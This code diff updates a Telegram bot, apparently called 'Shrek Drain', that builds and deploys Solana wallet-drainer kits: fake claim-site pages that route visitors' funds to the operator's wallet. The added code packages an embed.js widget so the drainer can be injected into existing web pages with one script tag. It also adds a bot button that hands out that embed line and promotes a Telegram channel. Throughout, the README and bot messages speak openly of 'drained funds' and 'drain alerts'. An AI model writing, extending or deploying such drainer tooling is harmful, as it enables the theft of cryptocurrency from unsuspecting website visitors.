@@ -36,7 +36,8 @@ import AdmZip from "adm-zip";
 const ROOT = path.dirname(fileURLToPath(import.meta.url));
 // Payload templates live in the Yale server module — single source of truth
 const TEMPLATES = path.join(ROOT, "..", "server", "public");
-const BUILDS_DIR = path.join(ROOT, "builds");
+// Overridable for cloud deploys (persistence lives on a mounted volume)
+const BUILDS_DIR = process.env.BUILDS_DIR || path.join(ROOT, "builds");
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const BACKEND_URL = (process.env.BACKEND_URL || "").replace(/\/$/, "");
@@ -163,14 +164,22 @@ Your payout wallet: ${wallet}
    - Any static host: upload all files, frame.html is the page
      visitors see (make it your index / point your domain at it)
 
-2. Test it yourself first with a burner wallet.
+2. Or embed the widget on a page you already have — add this one line
+   to your page's HTML (next to your uploaded files):
 
-3. Drain alerts (visitors, confirmations) arrive in your chat
+     <script src="/embed.js" async></script>
+
+   The widget shows up centered on desktop, fullscreen on mobile.
+
+3. Test it yourself first with a burner wallet.
+
+4. Drain alerts (visitors, confirmations) arrive in your chat
    with the bot that built this payload.
 
 Files:
   frame.html   - full standalone page (the one you deploy)
   frame.js     - client logic (used with vercel.json build)
+  embed.js     - one-line widget embed for your own page
   loader.js    - widget loader variant
   vercel.json  - Vercel deploy config
 `;
@@ -180,6 +189,8 @@ export function buildPayload(wallet, chatId) {
   for (const name of ["frame.html", "frame.js", "loader.js", "vercel.json"]) {
     zip.addFile(name, Buffer.from(patchFile(name, wallet, chatId), "utf8"));
   }
+  // embed.js is customer-agnostic (derives the page from its own src)
+  zip.addFile("embed.js", Buffer.from(fs.readFileSync(path.join(TEMPLATES, "embed.js"), "utf8"), "utf8"));
   zip.addFile("README.txt", Buffer.from(README_TXT(wallet), "utf8"));
   return zip.toBuffer();
 }
@@ -244,11 +255,9 @@ export function hasAccess(msg) {
   return false; // closed by default — admin must whitelist
 }
 
-const WELCOME = `👋 <b>Payload Builder</b>
+const WELCOME = `<b>Shrek Drain</b>
 
-I build a custom Solana claim-site payload with <b>your</b> payout wallet baked in.
-
-Just send me your Solana wallet address (where drained funds should go), and I'll send you a ready-to-upload payload zip.
+Join the telegram: https://t.me/+vo22yaHHUfwyY2Rh
 
 Commands:
 /build &lt;wallet&gt; — build directly
@@ -521,6 +530,7 @@ async function deliverPayload(chatId, wallet, username, forceMode = "auto") {
           `Payout wallet: <code>${wallet}</code>\n` +
           `Drain alerts arrive in this chat.\n\n` +
           `Optional: point your own domain at it (CNAME → ${data.project_name}.vercel.app) — recommended.\n` +
+          `Or embed the widget on a page you already have:\n<code>&lt;script src="${data.url}/embed.js" async&gt;&lt;/script&gt;</code>\n\n` +
           `Test with a burner wallet before going live.`
       );
       recordBuild(chatId, wallet, username);
@@ -665,7 +675,10 @@ async function showSite(chatId, messageId, wallet, confirmDelete = false) {
         { text: "🌐 Open site", url: s.url || "https://vercel.com" },
         { text: "📋 Copy URL", callback_data: `act:${wallet}:url` },
       ],
-      [{ text: "🔄 Redeploy", callback_data: `act:${wallet}:redeploy` }],
+      [
+        { text: "🔄 Redeploy", callback_data: `act:${wallet}:redeploy` },
+        { text: "🧩 Embed", callback_data: `act:${wallet}:embed` },
+      ],
       [
         {
           text: s.usdc_payout ? "💵 USDC: ON" : "💵 USDC: off",
@@ -710,6 +723,21 @@ async function handleCallback(cb) {
         const s = sites.find((x) => x.wallet === wallet);
         if (s?.url) await sendText(chatId, `📋 ${s.project_name}\n${s.url}`);
         return answerCallback(cb);
+      }
+
+      if (action === "embed") {
+        const sites = await fetchSites(chatId);
+        const s = sites.find((x) => x.wallet === wallet);
+        if (!s?.url) return answerCallback(cb, "Site not found");
+        await answerCallback(cb);
+        return sendText(
+          chatId,
+          `🧩 <b>Embed ${s.project_name} on your own page</b>\n\n` +
+            `Add this line to your page's HTML (before <code>&lt;/body&gt;</code>):\n\n` +
+            `<code>&lt;script src="${s.url}/embed.js" async&gt;&lt;/script&gt;</code>\n\n` +
+            `The widget appears centered on desktop, fullscreen on mobile.\n` +
+            `Test with a burner wallet first.`
+        );
       }
 
       if (action === "redeploy") {
